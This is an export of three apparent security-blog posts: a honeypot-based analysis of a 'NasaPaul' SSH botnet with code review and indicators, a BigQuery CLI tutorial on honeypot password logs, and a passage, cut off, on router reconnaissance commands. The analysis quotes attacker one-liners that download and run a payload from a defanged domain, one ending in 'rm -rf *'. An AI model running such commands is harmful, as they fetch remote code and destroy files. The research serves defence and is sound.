[{"content":"Updated: 2021-02-28 - Update detection section to explain why v.py might not be flagged by AV. Updated: 2021-03-03 - Divide article by LM Kill Chain phases instead of MITRE ATT\u0026amp;CK framework. Case Summary I collect live malware samples from honeypots running on public cloud servers. This case examines a repeated security event following a successful bruteforce attack against SSH where malware payloads ninfo and v.py are dropped from nasapaul[.]com. The samples examined in this post were captured on February 23rd, 2021.\nTimeline The security event described in this post was first logged on at 12:22:55 UTC on 2021-02-14. The event has been captured 33 times, with the latest related security event recorded at 16:03:19 UTC on 2021-02-25. If you are interested in viewing the raw logs associated with these repeated events, they can be found in this gist.\nDelivery In order to see any interaction from attackers on the honeypot, they must first brute force SSH. Successfully brute forcing the username admin and password password will allow the attacker to enter commands into an emulated shell. All entered commands return an error reporting the tool is not found (e.g. ls not found). In all instances of this repeated security event the first payload ninfo is seen after the attacker brute forces SSH.\nExploitation \u0026amp; Installation In 31 of the 33 captured events calling home to nasapaul[.]com the attacker downloads a payload, gives it execution permissions, and then runs the payload.\nwget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo Defense Evasion A change in this behavior is observed in two security events on 2021-02-16 where the following commands are entered:\nlscpu ; wget nasapaul[.]com/ninfo ; chmod +x * ; ./ninfo ; rm -rf * Here, the attacker now runs lscpu and after pulling and running ninfo it deletes all local files with rm -rf *. The rm -rf * is used to recursively destroy files ninfo and v.py in the working directory. Subsequent attacks on 2021-02-16 and later returned to the previous command line behavior, with no file removal process.\nCollection The purpose of ninfo is to collect system information. As a reminder, the output of the script is viewed by the attacker via their SSH session. This information can then be scraped, cataloged and/or utilized. The following information is gathered by ninfo:\n CPU CPU core count CPU stepping (similar to CPU version) CPU bogomips (a crude speed measurement of CPU) GPU type Disk space Uptime OS type OS version OS architecture Root or Privileged Process Access  Code Review ninfo code review Lines 4 - 19 specify the color used during output. These values are called throughout the script and result in colored formatting of information sent to standard out.\nLines 23 - 37 set variables for requested information. The script uses tools cut, sed, grep, head, and awk in order to manipulate the output of utility commands like lsb_release, free, uname, uptime, lscpi, and df and system files including /proc/cpuinfo and /proc/uptime. Using this technique the attacker is able to neatly print system information to the console in lines 55 - 63.\nLines 65 - 71 check to see if the script is running as a privileged process via the EUID or as root via UID. nu ai (not here) is printed if not root. ai (here) is printed if the UID or EUID is 0, indicating the script is running as a privileged process and/or the credentials in use by the attacker is root.\nNext, ninfo announces speed testul incepe in 3 secunde (speed test starts in three seconds) then echos out a countdown to standard out. In line 83 it pulls down a second payload from the nasapaul domain named v.py. In line 84 the script attempts to run that payload with perl. The following screenshot shows the output of ninfo if run without network connectivity or simulation:\nAdditional Details Source IP Origin The following information was sourced from the Talos Intelligence IP Reputation Lookup. This does not confirm an origin of attack, but rather gives us insight into the last hop on the internet. It is noted all IP addresses are owned by corporations associated with cloud hosting services.\n   IP NETWORK OWNER LOCATION     52.152.130.178 Microsoft Corporation Washington, United States   64.225.101.223 Digital Ocean Frankfurt am Main, Germany   167.99.253.119 Digital Ocean Frankfurt am Main, Germany   167.172.24.118 Digital Ocean Clifton, United States   178.62.231.95 Digital Ocean Amsterdam, Netherlands   188.166.99.239 Digital Ocean Amsterdam, Netherlands   188.166.124.29 Digital Ocean Amsterdam, Netherlands         A whois search for these IP addresses identify an organizational link ORG-DOI2-RIPE between some of the attacking IPs:\n 167.172.24.118/24 178.62.231.95/24 188.166.99.239/24 188.166.124.29/24  Language Indicators An identifying characteristic of this script is that the language used is a mix of English and Romanian. Searchinging for drept de root, versiune, testul incepe in, and secunde via google translator returns a language match for Romanian.\nA google search using code from the second payload v.py returns two positive hits:\n A malware sample from a github repo of malware collected by honeypots uploaded in DEC 2017. A speedtest-cli github repository pointing to file speedtest.py from Matt Martz.  To test to see if any files from github user sivel are being used by the attacker I hashed all files from the speedtest-cli github repo and compared these hashes against the hash for v.py. None of the hashes are matches, this means that if the attacker used a file from this repository it has since been modified. The results are shown below:\n86aa0f938b6d6a3b2ba54481f1debae2 v.py 051b5371b2a098f10d8271bbfbcd8ee6 CONTRIBUTING.md 3b83ef96387f14655fc854ddc3c6bd57 LICENSE 89ba249b2bf282b2ea9c35e5fd3a197d MANIFEST.in 8192020c86e390adb168431fdbf260c1 README.rst 0566968464b829958e9bf431eb1db62f setup.cfg 2a22f34184b9275db470c39026428709 setup.py 6697b8da88cf890de4b057c0151aad2a speedtest-cli.1 322eb3ec52f028e6b1df6bd0a9f6cb52 speedtest.py 37547186527ed0466ae145073f9012d1 tox.ini test/scripts/ 51b873473209d18958a05c767723836b source.py v.py code review The file v.py is 803 lines long, substantially longer than ninfo. If you would like to examine this file for yourself it can be retrieved from this github repository. Now we can review the code in v.py in order to understand more about its behavior.\nOverview in Comments This attacker put a lot of comments into their code. We see the following statements printed to console:\n1. Retrieving NasaPaul.com configuration 2. Retrieving NasaPaul.com server list The attacker switches to Romanian (the English translation is shown):\n3. Host Server is Google Cloud (Paul hides the IPs) 4. Looking for a server 5. Found a server start testing And then they use English\u0026hellip;\n6. testing download speed Then Romanian\u0026hellip;\n7. Download speed is XYZ Mbit/s Then English, and then Romanian again.\n8. Testing upload speed 9. The flood upload is XYZ Mbit/s After which point the script ends and the botnet logs out. Note that XYZ in this instance is a substitute for an upload/download speed value.\nMain Function I begin by looking at the main function def main() found on lines 793 - 797. The only defined functions called here are speedtest() and print_().\ndef main(): try: speedtest() except KeyboardInterrupt: print_('\\nCancelling...') The speedtest function is defined in the file on lines 553 - 790. We can get a sense of what the script is doing by logically following the calls to subroutines. This means you follow each call to a defined function, like a choose your own adventure book instead of reading the file start to finish. Though, you could totally do that too if you want to get a sense of the functions that might be called or preview to see if anything stylistically looks out of place or different. This code review will highlight some of the code using the comments printed to the console. If you\u0026rsquo;d like to skip ahead to the next section click here.\nRetrieving configuration from nasapaul[.]com References to nasapaul[.]com are seen within speedtest() on lines 624 and 632.\nThe excerpt below has been pulled from lines 623 - 624. Line 623 prints Retrieving NasaPaul.com configuration...' to console. This step of the python script executes regardless of internet connectivity.\n if not args.simple: print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Retrieving \\033[1;37m NasaPaul.com\\033[1;m \\033[1;31m configuration...') try: config = getConfig() except URLError: print_('Cannot retrieve speedtest configuration') sys.exit(1) In case you are wondering why args.simple returns true each execution, note that args is set by the the options parser seen in lines 568 to 604 where --simple becomes args.simple as args is set to an options tuple. options is created from parser.parse_args(). This logic is shared below:\n description = ( 'Command line interface for testing internet bandwidth using ' 'speedtest.net.\\n' '------------------------------------------------------------' '--------------\\n' 'https://github.com/sivel/speedtest-cli') parser = ArgParser(description=description) # Give optparse.OptionParser an `add_argument` method for # compatibility with argparse.ArgumentParser try: parser.add_argument = parser.add_option except AttributeError: pass parser.add_argument('--bytes', dest='units', action='store_const', const=('byte', 1), default=('bit', 8), help='Display values in bytes instead of bits. Does ' 'not affect the image generated by --share') parser.add_argument('--share', action='store_true', help='Generate and provide a URL to the speedtest.net ' 'share results image') parser.add_argument('--simple', action='store_true', help='Suppress verbose output, only show basic ' 'information') parser.add_argument('--list', action='store_true', help='Display a list of speedtest.net servers ' 'sorted by distance') parser.add_argument('--server', help='Specify a server ID to test against') parser.add_argument('--mini', help='URL of the Speedtest Mini server') parser.add_argument('--source', help='Source IP address to bind to') parser.add_argument('--timeout', default=10, type=int, help='HTTP timeout in seconds. Default 10') parser.add_argument('--secure', action='store_true', help='Use HTTPS instead of HTTP when communicating ' 'with speedtest.net operated servers') parser.add_argument('--version', action='store_true', help='Show the version number and exit') options = parser.parse_args() if isinstance(options, tuple): args = options[0] else: args = options del options Returning to the first block of code, after Retrieving NasaPaul.com configuration...' is printed to console, on line 626 we see a call to getConfig(). This function seen in lines 376 - 414 is shared below:\ndef getConfig(): \u0026quot;\u0026quot;\u0026quot;Download the speedtest.net configuration and return only the data we are interested in \u0026quot;\u0026quot;\u0026quot; request = build_request('://www.speedtest.net/speedtest-config.php') uh, e = catch_request(request) if e: print_('Could not retrieve speedtest.net configuration: %s' % e) sys.exit(1) configxml = [] while 1: configxml.append(uh.read(10240)) if len(configxml[-1]) == 0: break if int(uh.code) != 200: return None uh.close() try: try: root = ET.fromstring(''.encode().join(configxml)) config = { 'client': root.find('client').attrib, 'times': root.find('times').attrib, 'download': root.find('download').attrib, 'upload': root.find('upload').attrib} except AttributeError: # Python3 branch root = DOM.parseString(''.join(configxml)) config = { 'client': getAttributesByTagName(root, 'client'), 'times': getAttributesByTagName(root, 'times'), 'download': getAttributesByTagName(root, 'download'), 'upload': getAttributesByTagName(root, 'upload')} except SyntaxError: print_('Failed to parse speedtest.net configuration') sys.exit(1) del root del configxml return config In the function snippet below pulled from getConfig() above, a request is built using build_request for speedtest.net. build_request \u0026ldquo;build[s] a urllib2 request object to automatically add a user-agent header to all requests\u0026rdquo; for a url.\n request = build_request('://www.speedtest.net/speedtest-config.php') uh, e = catch_request(request) Following the creation of request, catch_request is described as \u0026ldquo;a helper function to catch common exceptions when establishing a connection with a HTTP/S request.\u0026rdquo; The result of the catch_request(request) and any resulting errors are stored in variables uh and e respectively. If an error is created and stored in variable e the script will gracefully exit:\nif e: print_('Could not retrieve speedtest.net configuration: %s' % e) sys.exit(1) On lines 386 - 393 of the getConfig() function a variable configxml of type tuple is created. The response from www.speedtest.net/speedtest-config.php in variable uh is appended to configxml. configxml[-1] points to the last value in the tuple configxml. If the length of this value is zero, then the while loop can break. If the value of the response from speednet.com is anything other than 200 OK then None is returned from getConfig().\nconfigxml = [] while 1: configxml.append(uh.read(10240)) if len(configxml[-1]) == 0: break if int(uh.code) != 200: return None uh.close() While the commented code reads, \u0026ldquo;retrieving configuration nasapaul[.]com\u0026rdquo; this behavior was not confirmed in the python script. Only communication to www.speedtest.net/speedtest-config.php was observed.\nRetrieving nasapaul Server List Lines 631 - 644 handle commands related to the Retrieving NasaPaul[.]com server list... comment printed to console:\nif not args.simple: print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Retrieving \\033[1;37m NasaPaul.com\\033[1;m \\033[1;31m server list...') if args.list or args.server: servers = closestServers(config['client'], True) if args.list: serverList = [] for server in servers: line = ('%(id)4s) %(sponsor)s (%(name)s, %(country)s) ' '[%(d)0.2f km]' % server) serverList.append(line) print_('\\n'.join(serverList).encode('utf-8', 'ignore')) sys.exit(0) else: servers = closestServers(config['client']) We want to look at the closestServers functions to get a better idea of what servers are being used in this block of code. If you want to review these functions briefly check out this gist.\nLooking at the closestServers() definition, the urls in use are:\n urls = [ '://www.speedtest.net/speedtest-servers-static.php', '://c.speedtest.net/speedtest-servers-static.php', '://www.speedtest.net/speedtest-servers.php', '://c.speedtest.net/speedtest-servers.php', ] Similar to what we\u0026rsquo;ve seen previously in getConfig() we see calls out to the listered urls using build_request and catch_request:\nfor url in urls: try: request = build_request(url) uh, e = catch_request(request) if e: errors.append('%s' % e) raise SpeedtestCliServerListError serversxml = [] while 1: serversxml.append(uh.read(10240)) if len(serversxml[-1]) == 0: break if int(uh.code) != 200: uh.close() raise SpeedtestCliServerListError uh.close() While the commented code read, retrieving nasapaul[.]com server list this behavior was not confirmed in the python script. Instead calls to speedtest.net are seen.\nHost Server is Google Cloud (Paul hides the IPs) On lines 645 and 648 a print_ statement below prints out Server Hostat De (Hosted Server) and Paul ascunde IPu (Paul hides the IPu).\n if not args.simple: print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Server Hostat De \\033[1;m \\033[1;37m%(isp)s\\033[1;m (\\033[1;37mPaul ascunde IPu\\033[1;m)\\033[1;37m...' % config['client']) However, this part of the script will print the ISP in use to console but no such evidence of \u0026ldquo;hiding IPs\u0026rdquo; was found in the python script.\nLooking for and Finding a Server Similar to the previous comment the comments, Cautam ce-l mai bun server(We are looking for the best server) and Server Gasit incepem Testele(Server found, tests are started) are printed to console prior to a call to getBestServers().\n if not args.simple: print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Cautam ce-l mai bun server \\033[1;m') print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Server Gasit incepem Testele \\033[1;m') best = getBestServer(servers) The function getBestServers() is defined on lines 498 - 534:\ndef getBestServer(servers): \u0026quot;\u0026quot;\u0026quot;Perform a speedtest.net latency request to determine which speedtest.net server has the lowest latency \u0026quot;\u0026quot;\u0026quot; results = {} for server in servers: cum = [] url = '%s/latency.txt' % os.path.dirname(server['url']) urlparts = urlparse(url) for i in range(0, 3): try: if urlparts[0] == 'https': h = HTTPSConnection(urlparts[1]) else: h = HTTPConnection(urlparts[1]) headers = {'User-Agent': user_agent} start = timeit.default_timer() h.request(\u0026quot;GET\u0026quot;, urlparts[2], headers=headers) r = h.getresponse() total = (timeit.default_timer() - start) except (HTTPError, URLError, socket.error): cum.append(3600) continue text = r.read(9) if int(r.status) == 200 and text == 'test=test'.encode(): cum.append(total) else: cum.append(3600) h.close() avg = round((sum(cum) / 6) * 1000, 3) results[avg] = server fastest = sorted(results.keys())[0] best = results[fastest] best['latency'] = fastest return best In this function, the passed variable servers has been set in lines 634 or 644 via a call to closestServers() using output created from the configServer() function, discussed in the previous sections. I found no evidence to suggest that any servers related to nasapaul[.]com were queried.\nTesting Download and Upload Speeds Finally, the download and upload speeds are collected using functions downloadspeed() and uploadspeed().\n if not args.simple: print_(('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Server Intretinut de \\033[1;37m%(sponsor)s\\033[1;m (\\033[1;37m%(name)s\\033[1;m) \\033[1;m[\\033[1;37m%(d)0.2f km\\033[1;m]\\033[1;37m:\\033[1;37m ' '%(latency)s ms\\033[1;31m' % best).encode('utf-8', 'ignore')) else: print_('Ping: %(latency)s ms' % best) sizes = [350, 500, 750, 1000, 1500, 2000, 2500, 3000, 3500, 4000] urls = [] for size in sizes: for i in range(0, 4): urls.append('%s/random%sx%s.jpg' % (os.path.dirname(best['url']), size, size)) if not args.simple: print_('\u0026gt;\u0026gt;\u0026gt;\u0026gt; Testing download speed', end='') dlspeed = downloadSpeed(urls, args.simple) if not args.simple: print_() print_('\u0026gt;\u0026gt;\u0026gt;\u0026gt; Download-ul este de : \\033[1;37m%0.2f M%s/s' % ((dlspeed / 1000 / 1000) * args.units[1], args.units[0])) sizesizes = [int(.25 * 1000 * 1000), int(.5 * 1000 * 1000)] sizes = [] for size in sizesizes: for i in range(0, 25): sizes.append(size) if not args.simple: print_('\\033[1;31m\u0026gt;\u0026gt;\u0026gt;\u0026gt; Testing upload speed', end='') ulspeed = uploadSpeed(best['url'], sizes, args.simple) if not args.simple: print_() print_('\u0026gt;\u0026gt;\u0026gt;\u0026gt; Upload-ul de flood este : \\033[1;37m%0.2f M%s/s\\033[1;31m' % ((ulspeed / 1000 / 1000) * args.units[1], args.units[0])) if args.share and args.mini: print_('Cannot generate a speedtest.net share results image while ' 'testing against a Speedtest Mini server') elif args.share: dlspeedk = int(round((dlspeed / 1000) * 8, 0)) ping = int(round(best['latency'], 0)) ulspeedk = int(round((ulspeed / 1000) * 8, 0)) The uploadspeed() and downloadspeed() functions launch FileGetter and FilePutter threats to calculate upload/download speeds. Nothing in these functions appeared malicious nor did they redirect to a malicious url.\nIt is noted, however, that the results of the speed test are sent to speedtest[.]net. This code is shown below:\n # Build the request to send results back to speedtest.net # We use a list instead of a dict because the API expects parameters # in a certain order apiData = [ 'download=%s' % dlspeedk, 'ping=%s' % ping, 'upload=%s' % ulspeedk, 'promo=', 'startmode=%s' % 'pingselect', 'recommendedserverid=%s' % best['id'], 'accuracy=%s' % 1, 'serverid=%s' % best['id'], 'hash=%s' % md5(('%s-%s-%s-%s' % (ping, ulspeedk, dlspeedk, '297aae72')) .encode()).hexdigest()] headers = {'Referer': 'http://c.speedtest.net/flash/speedtest.swf'} request = build_request('://www.speedtest.net/api/api.php', data='\u0026amp;'.join(apiData).encode(), headers=headers) f, e = catch_request(request) if e: print_('Could not submit results to speedtest.net: %s' % e) sys.exit(1) response = f.read() code = f.code f.close() In an effort to be clear, I will repeat that speedtest.net is the only domain used in the v.py script aside from the nasapaul[.]com references printed to console using print_(). All network related communication in the v.py script appears limited to speedtest.net.\nImpact Successful execution of ninfo results in losing information about system specification including hardware or virtualized hardware specifications described in the Collection section above. Successful execution of v.py results in information about the system\u0026rsquo;s bandwidth and level of privilege associated with the compromised login. This information is relayed to the attacker via the SSH session. Typically, these types of collections are stored and re-used either for manipulation by the original attacker or they could be sold on a criminal network for use in a DDoS for hire like a DDoSaaS offering.\nAll of these attacks originated from successful bruteforce attempts against SSH. There are a few strategies you can use to protect against SSH attacks. You could move the SSH port to a non-default port (e.g. from p22 to p43895). This will subvert some automated attacks, but it is a weak control because the new SSH port can be identified with a simple nmap scan. A more effective way to protect against SSH attacks would be to authenticate using an SSH key or using certificate-based authentication. To pair with this control, you should modify the global ssh configuration file (/etc/ssh/ssh_config) to disable password authentication. You could also use a service like fail2ban to put IPs with repeated failed authentication attempts to SSH on a denylist. For example, if an IP address fails to authenticate 10 times in a row fail2ban would jail the IP, effectively preventing it from being able to login using SSH for a period of time.\nUnanswered Questions \u0026amp; Opinions In my opinion these security events may be the result of a botnet looking for victim hosts to utilize as a part of a DDoS network and/or to be used to serve and collect information about other vulnerable hosts. I have reached this conclusion because the commands seen in the repeated security event are limited to collection information related to computer specifications and bandwidth. Another potential explaination could be that the botnet is searching for victims to mine cryptocurrency. Without further information, these conclusions are purely speculative.\nThere are a few questions leftover from this case I am still asking myself. Foremost in my mind is seeing a python script run with perl. I could see perl being remapped to a python binary but this behavior was not seen in ninfo. How does that work? Is the #!/usr/bin/env python on line 1 of the file enough for the interpreter to know to use python instead of perl? If I learn anything new related to this event I\u0026rsquo;ll update and mark the date at the top of this post and/or link to more information.\nDetections When scanned with clamAV no detections are yet seen:\nWhen I first uploaded ninfo to virustotal on 2021-02-23 it had 1/64 antivirus detections. Since then, the number has increased to 6/64.\nv.py remains at undetected as of 2021-02-27. This is not surprising since the script is a a bandwidth test that reaches out to a known good site, Speedtest by Ookla. Whether the script is malicious or not could be of debate, though, since this specific script v.py used in the context of data collection I would flag the hash.\nNetwork The following IP addresses were associated with one or more successful SSH brute force attacks.\n52.152.130.178 64.225.101.223 167.99.253.119 167.172.24.118 178.62.231.95 188.166.99.239 188.166.124.29 DNS The following hostnames were associated with one or more of the security events described in this post.\nnasapaul[.]com wpmudev[.]host File Hashes md5sum 678af2ec3251f8692c9324ffe64c198a ninfo 86aa0f938b6d6a3b2ba54481f1debae2 v.py sha256sum 19778a62055770a9e5f890e52227ccd39251bf23045c15383411638540ceabf7 ninfo 00e430b733cf199747c9c6e0f2e2fae6a045bbed9c0f0f993112b301fcdf5dbc v.py MITRE Tactics  T1595 Active Scanning: Scanning IP Blocks T1110 Brute Force  Password Guessing Password Spraying   T1190 Exploit Public-Facing Application T1078 Valid Accounts: Local Accounts T1119 Automated Collection T1059 Command and Scripting Interpreter  Unix Shell Python   T1070 Indicator Removal on Host: File Deletion  ","permalink":"https://malwaremily.com/posts/022-nasapaul/","summary":"Updated: 2021-02-28 - Update detection section to explain why v.py might not be flagged by AV. Updated: 2021-03-03 - Divide article by LM Kill Chain phases instead of MITRE ATT\u0026amp;CK framework. Case Summary I collect live malware samples from honeypots running on public cloud servers. This case examines a repeated security event following a successful bruteforce attack against SSH where malware payloads ninfo and v.py are dropped from nasapaul[.]com. The samples examined in this post were captured on February 23rd, 2021.","title":"NasaPaul Botnet: A Need for Speed"},{"content":"Curious about BigQuery? This super quick tutorial will help you get started. BigQuery is a Google Cloud Platform service that provides serverless, scalable data analysis fast. This tutorial will discuss the basics of working with BigQuery including how to create datasets and tables, upload information to them, and how to make queries using the BigQuery command-line interface tool bq.\nPre-Config In order to follow along, you\u0026rsquo;ll need to have done the following:\n Install Google SDK components Authenticate a connection to your GCP Account Be familiar with SQL Statements  Create a Temporary Project Create a temporary project while you get familiar with BigQuery. Think of a project as a container object that will hold all GCP resources assigned to it. The PROJECT_ID is the name of the project and it will need to be a unique value not in use by any project in existence. For example, I found PROJECT_ID \u0026ldquo;sample\u0026rdquo; was already taken but found \u0026ldquo;sample01\u0026rdquo; was available.\ngcloud projects list gcloud projects create PROJECT_ID Once the project creation is successful, verify by listing your current working projects. Then set the current working project to your new PROJECT_ID.\ngcloud projects list gcloud config project set PROJECT_ID Create a new Dataset First, we\u0026rsquo;ll create a new dataset named sample.\n$bq mk sample Dataset 'PROJECT_ID:sample' successfully created. Upload a Table Now its time to upload data to a table for analysis. In a previous post I mentioned parsing the docker logs to pull information about source-ip addresses and username and password attempts made by attacking entities using egrep and sed. For this exercise we\u0026rsquo;ll use my public gist. Download this file and upload the data to a table in your dataset using the command pattern bq load DATASET_ID.TABLE_ID FILENAME FIELD1:DATA_TYPE, as shown below.\n$bq load sample.passwords passwords.txt password:string Upload complete. Waiting on bqjob_r4c9403a495b4f4ad_00000177757b1dc7_1 ... (0s) Current status: DONE View the available tables in dataset sample.\n$bq ls sample tableId Type Labels Time Partitioning Clustered Fields ----------- ------- -------- ------------------- ------------------ passwords TABLE And view the table schema you created for represented earlier as FIELD1:DATATYPE.\n$bq show sample.passwords Table malwaremily:sample.passwords Last modified Schema Total Rows Total Bytes Expiration Time Partitioning Clustered Fields Labels ----------------- --------------------- ------------ ------------- ------------ ------------------- ------------------ -------- 05 Feb 22:55:41 |- password: string 537 3329 Run Queries Woo! We can run some queries to pull information. Queries can be made with the general pattern bq query \u0026quot;SQL_STATEMENT\u0026quot;.\nTop 10 most commen password attempts We can count the top 10 password occurrences with COUNT.\n$bq query \u0026quot;SELECT COUNT(password) AS PASS_COUNT, password FROM sample.passwords GROUP BY password ORDER BY PASS_COUNT DESC LIMIT 10\u0026quot; Waiting on bqjob_r21d3499c472ace56_0000017782fd4af8_1 ... (0s) Current status: DONE +------------+-----------+ | PASS_COUNT | password | +------------+-----------+ | 61 | password | | 49 | 1 | | 36 | P | | 30 | root | | 26 | A | | 22 | admin | | 20 | 123456 | | 14 | p | | 14 | 123 | | 8 | raspberry | +------------+-----------+ We can pull the top 10 most common password attempts using the COUNT, GROUP, ORDER, DESC and LIMIT keywords. COUNT will count the occurrence of each password and save the related values in column PASS_COUNT. The GROUP keyword allow us to group by passwords and then ORDER the results by PASS_COUNT in descending order with DESC. We limit the number of results returned with LIMIT.\nYou may be wondering why we order the results by column password and not by the custom aggregate PASS_COUNT. The reason for this is because the default SQL used by bq does not allow grouping by an aggregate. This is demonstrated in the query below.\nbq query \u0026quot;SELECT COUNT(password) AS PASS_COUNT, password FROM sample.passwords GROUP BY PASS_COUNT ORDER BY password DESC LIMIT 10\u0026quot; The error reads Cannot group by an aggregate. Consider using SQL, which allows grouping by any expression. But aren\u0026rsquo;t we using SQL already? Well, yes but BigQuery differentiates between standard SQL and legacy SQL dialect. What is the default? Right now, it depends on how you access BigQuery.\nGCP documentation reads, \u0026ldquo;In the Cloud Console and the client libraries, standard SQL is the default. In the bq command-line tool and the REST API, legacy SQL is the default.\u0026rdquo; Some searching on public forums like StackOverflow suggest that Standard SQL offers a better experience with less \u0026lsquo;gotchas\u0026rsquo; than traditional SQL. While this post uses the default legacy SQL, standard SQL can be enabled for the BigQuery command-line interface. To do so, read the \u0026ldquo;Setting standard SQL as the defualt for the command-line tool\u0026rdquo; from the GCP documentation.\nDelete your test environment Once you\u0026rsquo;re done with the project the environment should be deleted.\ngcloud projects delete PROJECT_ID If you would like to only delete the dataset, you can do so with the following command:\nbq rm -r sample Next Steps For more information about getting started with the bq cli check out this google tutorial where you will use a sample Shakespeare dataset provided by google. If you\u0026rsquo;d like to automate this behavior then you might be interested in learning more about the C#, Go, Java, Node.js, PHP, Python and/or Ruby client libraries.\n ","permalink":"https://malwaremily.com/posts/012-bigquery/","summary":"Curious about BigQuery? This super quick tutorial will help you get started. BigQuery is a Google Cloud Platform service that provides serverless, scalable data analysis fast. This tutorial will discuss the basics of working with BigQuery including how to create datasets and tables, upload information to them, and how to make queries using the BigQuery command-line interface tool bq.\nPre-Config In order to follow along, you\u0026rsquo;ll need to have done the following:","title":"Using BigQuery CLI for Honeypot Log Analysis"},{"content":"Last Updated: 2021-02-04\nLast month, I wrote a post about setting up honeypots on GCP where I stood up a low-interaction SSH honeypot. Since then, I\u0026rsquo;ve been able to log a few megabytes worth of unauthorized behavior. This post will report on a repeated security event targeting misconfigured MikroTik routers.\n Event Behavior The attacker logs into the honeypot using admin/password and then sends the commands seen below into the honeypot terminal. Several IP addresses have been logged exhibiting the same command entry patterns suggesting botnet activity. These source IPs are shared at the end of the post.\n/ip cloud print ifconfig uname -a cat /proc/cpuinfo ps | grep '[Mm]iner' ps -ef | grep '[Mm]iner' ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* echo Hi | cat -n  Observations In order to try to attribute a malware campaign to this behavior, we must analyze the movements by the attacking entity. This section discusses observations relating the commands used to potential motives in an attempt to learn more about the event behavior.\n/ip cloud print The command /ip cloud print prints the parameters set for RouterOS, the OS used by MikroTik devices. You can read about this command in the MikroTik wiki. Other tools using this command have not yet been identified, in accoradance with this, the command may be specific to MikroTik devices. MikroTik is a popluar networking vendor in Latvia. We will touch on MikroTik later on in this post.\nifconfig, uname, /proc/cpuinfo The attackers search for ifconfig, uname, and proc/cpuinfo, in that order. ifconfig prints networking information. When called with no flags information about connected network interfaces are printed to the console, including your IP address and what kind of network interaces are available/active. Some network interfaces can give clues about the envronment a device is running in. For example, running ifconfig in a GCP Ubuntu 18.04 VM returns the lo loopback interface and ens4. Machines with Docker installed with show docker0.\nuname print basic system information. uname -a will print all system information. On a GCP Ubuntu 18.04 VM uname -a returns:\n$ uname -a Linux monitor 4.15.0-1091-gcp #104~16.04.1-Ubuntu SMP Tue Dec 15 19:05:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux cat /proc/cpuinfo prints CPU information to the screen. Here is an example of output on a GCP Ubuntu 18.04 VM:\nThese commands are used to gather information about the device.\nps -ef | grep '[Mm]iner' The ps command will print running process and along with some information about them. The -ef flags will print every process using the standard sytax where -e selects all processes and -f triggers full-format listing. It is interesting that both ps and ps -ef are used in the event. An example of the differences between the two commands is shown on a GCP Ubuntu 18.04 VM below:\nPiping the active process output to grep [Mm]iner will return all processes with the word miner or Miner in them. This behavior may indicate the attacker is searching for active cryptominers running on the misconfigured system. Normally, running this command on say a GCP Ubunt 18.04 VM would return nothing, example below:\nls -la /dev/ttyGSM* /dev/ttyUSB-mod* ... The botnet uses ls -la to search for specific set of system files. I\u0026rsquo;ve associated the requested files with potential related router services and listed the results the table below.\n   FILE SERVICE     /dev/ttyGSM* GSM   /dev/ttyUSB-mod* GSM   /var/spool/sms/* SMS   /var/log/smsd.log SMS   /etc/smsd.conf* SMS   /usr/bin/qmuxd QMUX   /var/qmux_connect_socket QMUX   /etc/config/simman Unknown/SIM Card   /dev/modem* GSM   /var/config/sms/* SMS    SMS Yes, SMS like text messages. SMS stands for short message service used by mobile device and internet-connected devices. MikroTik supports sending SMS messages via GSM modem. Users report configuring their MikroTik to use text messages for router management including receiving health alert text messages from the router and/or being able to reset the admin/user password via SMS. See the MikroTik Wiki for more information.\nGSM GSM stands for Global System for Mobile Communications. GSM is the standard protocol for mobile communications. On a Mikrotik Router /dev/ttyGSM* may return the virtual serial ports in use by the RouterOS modem (kernel.org, 2011). Users in StackExchange discuss gaining a direct serial connection to a RB4011 MikroTik router using sudo screen /dev/ttyUSB0 115200 cs8 ixoff implying that ls -la /dev/ttyUSB* can be used to identify a live serial connection to an active router.\nQMUX /usr/bin/qmuxd points to the QMUX daemon. gmuxd is a linux user-space process to multiplex between programs interfacing with QMI (Qualcomm MSM Interface) and one or more shared-memory based QMUX ports offered by the broadband processor (Osmocom,2019). This Github issue from 2017 suggests it is related to critical modem-related messaging services. This other issue cites qmuxd as being the daemon responsible for talking to the modem via shared memory on Android.\n/etc/config/simman Limited information on /etc/config/simman was discovered on common search engines. For instance, DuckDuckGo will only return 2 unique results. The only conclusive results returned with this string were live honeypot dashboards and websites written in Russian. I\u0026rsquo;ve translated the relevant results below.\n  Как изменить APN? : Техническая поддержка nano /etc/config/simman. Меняем параметры option GPRS_apn. config sim0 option priority \u0026lsquo;1\u0026rsquo; option GPRS_apn \u0026lsquo;tele91.msk\u0026rsquo; config sim1 option priority \u0026lsquo;0\u0026rsquo; option GPRS_apn \u0026lsquo;tele91.msk\u0026rsquo; Сохраняем файл с настройками: Ctrl+X потом подтверждаем сохранение под тем же именем\n  How to change APN?: Technical Support nano / etc / config / simman. Change the parameters of option GPRS_apn. config sim0 option priority \u0026lsquo;1\u0026rsquo; option GPRS_apn \u0026lsquo;tele91.msk\u0026rsquo; config sim1 option priority \u0026lsquo;0\u0026rsquo; option GPRS_apn \u0026lsquo;tele91.msk\u0026rsquo; Save the settings file: Ctrl + X then confirm saving under the same name\n   Настройки Менеджера SIM карт : Техническая поддержка Для настройки Менеджера SIM с помощью консоли, необходимо открыть файл /etc/config/simman: nano /etc/config/simman. В открывшемся окне Вы можете произвести конфигурацию: config simman \u0026lsquo;core\u0026rsquo;\n  SIM Card Manager Settings: Technical Support To configure the SIM Manager using the console, open the file /etc/config/simman: nano /etc/config/simman. In the window that opens, you can configure: config simman \u0026lsquo;core\u0026rsquo;\n  This was an additional result returned from Google:\n Роутеры TELEOFIS RTU968, RTU1068 V2. Руководство \u0026hellip;\n  Routers TELEOFIS RTU968, RTU1068 V2. Manual \u0026hellip;\n  The translated results suggest the botnet is checking for the existence of a configuration file related to SIM card management.\nOn a new GCP Ubuntu 18.04 VM the same la -la command returns no file matches: echo Hi | cat -n To help explain this behavior, I\u0026rsquo;ve displayed 